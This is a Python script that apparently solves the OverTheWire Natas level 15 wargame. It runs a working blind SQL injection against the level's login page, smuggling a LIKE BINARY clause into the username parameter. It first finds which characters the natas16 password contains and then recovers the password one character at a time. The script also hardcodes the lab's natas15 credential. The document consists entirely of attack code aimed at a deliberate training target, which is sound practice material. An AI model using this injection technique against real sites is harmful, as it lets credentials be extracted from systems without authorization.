import requests, string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth_uname = "natas15"
auth_pwd = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

chars = string.ascii_letters
chars += string.digits
print("Possible letters:", chars)

print("Beggining scan")
pass_chars = []
for char in chars:
  url2 = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%','&debug'])
  r = requests.get(url2, auth=(auth_uname, auth_pwd))
  if "This user exists." in r.text:
    pass_chars.append(char)
    print("Chars in password:{0}".format("".join(pass_chars)))

print("the password is a permutation of", "".join(pass_chars))
print("-----------------------")
print("Finding the correct permutation")
password = ""
last_password = ""
url = "http://natas15.natas.labs.overthewire.org/index.php"

for i in range(1,64):
  if i > 1 and last_password == password:
    break;
  last_password = password
  for char in pass_chars:
    test = password + char;
    uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',test,'%','&debug'])
    r = requests.get(uri, auth=(auth_uname, auth_pwd))
    if "This user exists." in r.text:
      password += char
      print("Password:",password)
      break;

print("Final password:",password)


